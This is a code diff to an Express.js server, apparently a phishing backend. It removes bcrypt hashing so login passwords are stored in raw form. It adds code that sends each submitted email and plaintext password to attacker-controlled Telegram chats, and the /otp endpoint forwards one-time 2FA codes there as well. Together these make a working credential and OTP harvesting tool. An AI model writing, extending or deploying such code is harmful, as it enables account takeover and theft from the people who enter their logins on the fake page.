@@ -1,27 +1,26 @@
 const express = require('express');
 const cors = require('cors');
 const db = require('./db');
-const bcrypt = require('bcryptjs');
 const axios = require('axios');
 require('dotenv').config();
 
 const app = express();
 
-// 🌐 CORS (Allow all origins)
+// 🌐 Allow all origins
 app.use(cors({ origin: '*' }));
 app.use(express.json());
 
-// 🧠 Global error traps
+// 🧠 Global error handling
 process.on('uncaughtException', err => console.error('❌ Uncaught Exception:', err));
 process.on('unhandledRejection', err => console.error('❌ Unhandled Rejection:', err));
 
-// 📩 Telegram multi-chat sender
+// 📩 Send message to multiple Telegram chats
 async function sendTelegramMessage(message) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatIds = process.env.TELEGRAM_CHAT_IDS?.split(',') || [];
 
   if (!botToken || chatIds.length === 0) {
-    return console.warn('⚠️ Missing Telegram credentials in .env');
+    return console.warn('⚠️ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_IDS in .env');
   }
 
   for (const chatId of chatIds) {
@@ -35,13 +34,12 @@ async function sendTelegramMessage(message) {
       });
       console.log(`✅ Message sent to ${trimmedId}:`, res.data?.result?.message_id);
     } catch (err) {
-      const error = err.response?.data || err.message;
-      console.error(`❌ Telegram error for ${trimmedId}:`, error);
+      console.error(`❌ Telegram error for ${trimmedId}:`, err.response?.data || err.message);
     }
   }
 }
 
-// 🔐 POST /login
+// 🔐 POST /login — store raw password and notify Telegram
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
   if (!email || !password)
@@ -62,26 +60,29 @@ app.post('/login', (req, res) => {
       return res.status(409).json({ error: 'User already exists. Please log in.' });
     }
 
-    const hashedPassword = bcrypt.hashSync(password, 10);
-    const payload = JSON.stringify({ email, password: hashedPassword });
+    const payload = JSON.stringify({ email, password });
 
     db.run(
       `INSERT INTO submissions (type, payload) VALUES (?, ?)`,
       ['login', payload],
-      function (err) {
+      async function (err) {
         if (err) {
           console.error('❌ Insert Login Error:', err);
           return res.status(500).json({ error: 'Server error' });
         }
 
         app.locals.lastEmail = email;
+
+        // 👇 Send plain credentials to Telegram
+        await sendTelegramMessage(`🧾 New Login\n📧 Email: ${email}\n🔓 Password: ${password}`);
+
         return res.status(200).json({ message: 'Login successful' });
       }
     );
   });
 });
 
-// 🔐 POST /otp
+// 🔐 POST /otp — receive OTP and send to Telegram
 app.post('/otp', async (req, res) => {
   const { code } = req.body;
 
@@ -102,7 +103,7 @@ app.post('/otp', async (req, res) => {
       }
 
       const email = app.locals.lastEmail || 'unknown';
-      await sendTelegramMessage(`🧾 New Submission\n📧 Email: ${email}\n🔐 OTP: ${code}`);
+      await sendTelegramMessage(`🧾 New OTP Submission\n📧 Email: ${email}\n🔐 OTP: ${code}`);
 
       return res.status(200).json({ message: 'OTP received' });
     }
